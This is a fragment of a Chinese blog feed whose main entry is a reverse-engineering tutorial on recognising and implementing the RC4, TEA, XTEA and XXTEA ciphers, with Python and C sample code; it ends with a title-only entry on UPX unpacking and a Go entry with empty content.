    <content type="html"><![CDATA[<h1 id="逆向常见加密算法"><a href="#逆向常见加密算法" class="headerlink" title="逆向常见加密算法"></a>逆向常见加密算法</h1><h2 id="0x10-RC4"><a href="#0x10-RC4" class="headerlink" title="0x10 RC4"></a>0x10 RC4</h2><h3 id="简绍"><a href="#简绍" class="headerlink" title="简绍"></a>简绍</h3><p>在密码学中，RC4（Rivest Cipher 4）是一种流加密算法，密钥长度可变，它加解密使用相同的密钥）因此也属于<strong>对称加密算法</strong>，RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。</p><p>补充说明：序列密码（流密码）：</p><p>流密码也属于对称密码，但与分组加密算法不同的是，流密码不对明文数据进行分组，而是用密钥生成与明文一样长短的密码流对明文进行加密，加解密使用相同的密钥。也就是说，RC4不是对明文进行分组处理，而是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密。</p><h3 id="解密逻辑"><a href="#解密逻辑" class="headerlink" title="解密逻辑"></a>解密逻辑</h3><p>S盒初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br></code></pre></td></tr></table></figure><p>生产密钥流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">i = j = <span class="hljs-number">0</span><br>key_stream = []<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    j = (j + S[i]) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br>    key_stream.append(S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br></code></pre></td></tr></table></figure><p>加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plain)) :<br>    plain[i] ^= key_stream[i]<br><br></code></pre></td></tr></table></figure><p>完整脚本示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span></span>):<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span>, plaintext: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    s = init_sbox(key)<br>    i = j = <span class="hljs-number">0</span><br>    ciphertext = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> plaintext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]<br>        k = s[(s[i] + s[j]) % <span class="hljs-number">256</span>]<br>        ciphertext.append(char ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ciphertext)<br><br><span class="hljs-comment"># 示例用法</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">b&quot;secretkey&quot;</span><br>    plaintext = <span class="hljs-string">b&quot;Hello, RC4 Encryption!&quot;</span><br>    <br>    <span class="hljs-comment"># 加密</span><br>    encrypted = rc4_encrypt(key, plaintext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ciphertext (Hex):&quot;</span>, encrypted.<span class="hljs-built_in">hex</span>())<br><br></code></pre></td></tr></table></figure><h2 id="0x02-TEA系列加密"><a href="#0x02-TEA系列加密" class="headerlink" title="0x02 TEA系列加密"></a>0x02 TEA系列加密</h2><h3 id="简绍-1"><a href="#简绍-1" class="headerlink" title="简绍"></a>简绍</h3><p>TEA是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。<br>TEA算法每一次可以操作64bit(8byte)，采用128bit(16byte)作为key，算法采用迭代的形式，推荐的迭代轮数是64轮，最少32轮。<br>为解决TEA算法密钥表攻击的问题，TEA算法先后经历了几次改进，<strong>tea-&gt;xtea-&gt;xxtea</strong>。<br>TEA系列算法中均使用了一个DELTA常数，但DELTA的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA的值取为黄金分割数与232的乘积，取整后的十六进制值为0x9e3779B9，用于保证每一轮加密都不相同。但有时该常数会以减法的形式出现，-0x61C88647&#x3D;0x9E3779B9，因此出现了0x61c88647时也应当注意。</p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><h4 id="加密逻辑"><a href="#加密逻辑" class="headerlink" title="加密逻辑"></a>加密逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> u32;<br><span class="hljs-type">const</span> u32 delta = <span class="hljs-number">0x9e3779b9</span>; <span class="hljs-comment">//魔数</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> rounds = <span class="hljs-number">32</span>;        <span class="hljs-comment">//加密轮数</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * v , <span class="hljs-type">uint32_t</span> * k)</span> &#123;<br>    u32 v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    u32 k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    u32 sum = <span class="hljs-number">0</span>;<br>    <br><span class="hljs-comment">// TEA</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;     <span class="hljs-comment">//加密流程</span><br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * v , <span class="hljs-type">uint32_t</span> * k)</span> &#123;<br>    u32 v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    u32 k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    u32 sum = <span class="hljs-number">32</span> * delta;<br>    <br><span class="hljs-comment">// Tea</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br><br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt_multiple_blocks</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * text , <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span> *)text;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)key;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)  <span class="hljs-comment">//一组只能加密八个字节</span><br>    &#123;<br>        encrypt(v + i, k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密后的数据：%u %u\n&quot;</span>, v[i], v[i+<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x ,&quot;</span>, text[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt_multiple_blocks</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * text , <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span> *)text;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)key;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)  <span class="hljs-comment">//8组</span><br>    &#123;<br>        decrypt(v + i, k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：%u %u\n&quot;</span>, v[i], v[i+<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, text[i]);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> plain[] = &#123;<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x7d</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0xf7</span> ,<span class="hljs-number">0xb3</span> ,<span class="hljs-number">0xc5</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0xce</span> ,<span class="hljs-number">0xda</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0x1a</span> ,<span class="hljs-number">0x26</span> ,<span class="hljs-number">0x56</span> ,<span class="hljs-number">0x5a</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x2</span> ,<span class="hljs-number">0xd</span> ,<span class="hljs-number">0xed</span> ,<span class="hljs-number">0x7</span> ,<span class="hljs-number">0xa8</span> ,<span class="hljs-number">0xb9</span> ,<span class="hljs-number">0xee</span> ,<span class="hljs-number">0x36</span> ,<span class="hljs-number">0x59</span> ,<span class="hljs-number">0x11</span> ,<span class="hljs-number">0x87</span> ,<span class="hljs-number">0xfd</span> ,<span class="hljs-number">0x5c</span> ,<span class="hljs-number">0x23</span> ,<span class="hljs-number">0x24</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a;<br>    encrypt_multiple_blocks(plain, keys);<br>    decrypt_multiple_blocks(cipher , keys);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="特征识别"><a href="#特征识别" class="headerlink" title="特征识别"></a>特征识别</h4><ul><li>标准DELTA常熟（魔数）</li><li>密钥为16字节（4个DWORD）</li><li>加密轮数为16&#x2F;32&#x2F;64轮</li><li>加密结构中存在左4右5位移和很多异或</li><li>加密结构中存在轮加&#x2F;减相同常熟的语句</li></ul><h3 id="xTEA"><a href="#xTEA" class="headerlink" title="xTEA"></a>xTEA</h3><h4 id="加密逻辑-1"><a href="#加密逻辑-1" class="headerlink" title="加密逻辑"></a>加密逻辑</h4><p>区别于TEA加密的只有轮加密过程，魔数都也一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//encrypt过程</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>    v0 += (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="hljs-number">3</span>]);<br>    sum += delta;<br>    v1 += (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>&#125;<br><span class="hljs-comment">//decrypt过程</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rounds; i ++) &#123;<br>    v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>    sum -= delta;<br>    v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="hljs-number">3</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="特征识别-1"><a href="#特征识别-1" class="headerlink" title="特征识别"></a>特征识别</h4><ul><li>同TEA加密</li><li>加密结构中存在右移11位并3的运算</li></ul><h3 id="xxTEA"><a href="#xxTEA" class="headerlink" title="xxTEA"></a>xxTEA</h3><h4 id="加密逻辑-2"><a href="#加密逻辑-2" class="headerlink" title="加密逻辑"></a>加密逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> u32;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9 <span class="hljs-comment">//魔数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea</span><span class="hljs-params">(u32* v , <span class="hljs-type">int</span> n , u32* key)</span>&#123;<br>    u32 y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br><br>    <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">//正数加密 复数解密</span><br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;  <span class="hljs-comment">//特征识别</span><br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span>&#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p ++ )&#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">-1</span>) &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span>&#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p --)&#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[] = <span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> plain[] = &#123;<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x7d</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<span class="hljs-number">0xc3</span> ,<span class="hljs-number">0x43</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0xf3</span> ,<span class="hljs-number">0xcc</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x3</span> ,<span class="hljs-number">0xc8</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0x9b</span> ,<span class="hljs-number">0x7</span> ,<span class="hljs-number">0xae</span> ,<span class="hljs-number">0xcb</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x23</span> ,<span class="hljs-number">0xe7</span> ,<span class="hljs-number">0x4f</span> ,<span class="hljs-number">0xe0</span> ,<span class="hljs-number">0xe4</span> ,<span class="hljs-number">0x6a</span> ,<span class="hljs-number">0x80</span> ,<span class="hljs-number">0xbe</span> ,<span class="hljs-number">0xcc</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0xbc</span> ,<span class="hljs-number">0x2f</span> ,<span class="hljs-number">0xa9</span> ,<span class="hljs-number">0x1d</span> ,<span class="hljs-number">0xff</span> ,<span class="hljs-number">0xc1</span> ,<span class="hljs-number">0x64</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-comment">// 加密 plain</span><br>    xxtea((u32 *)plain, <span class="hljs-keyword">sizeof</span>(plain) / <span class="hljs-number">4</span>, (u32 *)keys);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Encrypted plain: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(plain); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x, &quot;</span>, plain[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// 解密 cipher</span><br>    xxtea((u32 *)cipher, -(<span class="hljs-keyword">sizeof</span>(cipher) / <span class="hljs-number">4</span>), (u32 *)keys);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted cipher: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(cipher); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, cipher[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Go语言逆向入门</title>
    <link href="/2025/01/16/Go%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
    <url>/2025/01/16/Go%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>手脱UPX壳不求人教程</title>
    <link href="/2025/01/15/%E6%89%8B%E8%84%B1UPX%E5%A3%B3%E4%B8%8D%E6%B1%82%E4%BA%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2025/01/15/%E6%89%8B%E8%84%B1UPX%E5%A3%B3%E4%B8%8D%E6%B1%82%E4%BA%BA%E6%95%99%E7%A8%8B/</url>
    
